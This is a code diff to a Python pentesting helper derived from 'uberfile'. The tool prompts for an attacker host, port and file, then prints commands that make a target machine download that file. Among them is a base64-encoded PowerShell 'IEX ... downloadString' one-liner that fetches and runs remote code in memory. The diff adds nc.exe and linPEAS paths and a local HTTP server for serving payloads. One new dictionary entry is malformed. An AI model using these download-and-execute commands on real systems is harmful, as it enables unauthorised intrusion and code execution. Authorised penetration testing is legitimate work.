@@ -1,28 +1,28 @@
 #!/usr/bin/env python3
-# Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)
-# Author: Amine B (en1ma - @_1mean)
+# Author: Bigyls
+# Based on https://github.com/ShutdownRepo/uberfile (Shutdown)
 
 import argparse
-from base64 import b64encode
 import sys
 import os
-import re
 import psutil
 import socket
 from colorama import Fore
 from colorama import Style
-import platform
-if platform.system() == 'Windows':
-    from consolemenu import *
-else:
-    from simple_term_menu import TerminalMenu
+from base64 import b64encode
+from simple_term_menu import TerminalMenu
+
+here = os.getcwd()
+
+files = {"windows": {
+    "nc.exe": "/opt/resources/windows/nc.exe",
+}, "linux": {
+    "linpeas.sh", "/opt/resources/linux/linPEAS/linpeas.sh"
+}}
 
 def menu(title, menu_list):
-    if platform.system() == 'Windows':
-        selection = SelectionMenu.get_selection(menu_list, title=title, show_exit_option=False)
-    else:
-        menu = TerminalMenu(menu_list, title=title)
-        selection = menu.show()
+    menu = TerminalMenu(menu_list, title=title)
+    selection = menu.show()
     return menu_list[selection]
 
 def menu_with_custom_choice(title, menu_list):
@@ -30,10 +30,7 @@ def menu_with_custom_choice(title, menu_list):
     selection = menu(title, menu_list)
     if selection == 'Custom':
         print(f'(custom) {title}')
-        if platform.system() == 'Windows':
-            selection = input('>> ')
-        else:
-            selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
+        selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
         return selection
     else:
         return selection.split('(')[1].split(')')[0]
@@ -86,15 +83,12 @@ def get_options():
         options.LHOST = select_address()
     if not options.LPORT:
         menu_list = [
-            'updog (9090)',
-            'python http server (8000)',
             'HTTP (80)',
-            'HTTPS (443)'
+            'HTTPS (443)',
         ]
         options.LPORT = menu_with_custom_choice("Port serving the files?", menu_list)
     if not options.INPUTFILE:
-        lookupdir = os.getcwd()
-        menu_list = [ f for f in os.listdir(lookupdir) if os.path.isfile(os.path.join(lookupdir, f)) ]
+        menu_list = [ f for f in os.listdir(here) if os.path.isfile(os.path.join(here, f)) ]
         options.INPUTFILE = menu('Which file do you want the target to download?', menu_list)
     if not options.OUTPUTFILE:
         menu_list = ['Same filename ({})'.format(options.INPUTFILE)]
@@ -142,6 +136,16 @@ def populate_post_options_commands():
     add_command(commands_dict=windows, type='powershell', notes="In memory (base64)", command='''powershell.exe -nop -enc "{}"'''.format(b64encode("IEX(New-Object Net.WebClient).downloadString('http://{LHOST}:{LPORT}/{INPUTFILE}')".replace('{LHOST}', options.LHOST).replace('{LPORT}',options.LPORT).replace('{INPUTFILE}',options.INPUTFILE).replace('{OUTPUTFILE}',options.OUTPUTFILE).encode('UTF-16LE')).decode('utf-8')))
     add_command(commands_dict=windows, type='powershell', notes="Execution policy bypass", command='''https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#execution-policy''')
 
+def run_server(LHOST, LPORT, INPUTFILE):
+    if not os.path.isabs(INPUTFILE):
+        INPUTFILE = os.path.dirname(os.path.abspath(INPUTFILE))
+    if os.path.exists(INPUTFILE):
+        os.system(f"python3 -m http.server -b {LHOST} -d {INPUTFILE} {LPORT}")
+        return True
+    else:
+        print(Fore.RED + Style.BRIGHT + "Input file not found" + Style.RESET_ALL)
+        return False
+
 if __name__ == '__main__':
     windows = {}
     linux = {}
@@ -159,3 +163,7 @@ if __name__ == '__main__':
         print(Fore.BLUE + Style.BRIGHT + '[' + str(command_index) + '] ' + print_notes + Style.RESET_ALL + print_command + '\n')
     cmdline = f'{sys.argv[0]} --lhost {options.LHOST} --lport {options.LPORT} --target-os {options.TARGETOS} --command {options.TYPE} --input-file {options.INPUTFILE} --output-file {options.OUTPUTFILE}'
     print(Fore.RED + Style.BRIGHT + 'CLI command used\n' + Style.RESET_ALL + cmdline + '\n')
+    if run_server(options.LHOST, options.LPORT, options.INPUTFILE):
+        print(Fore.GREEN + Style.BRIGHT + "Server running" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + Style.BRIGHT + "Server failed" + Style.RESET_ALL)
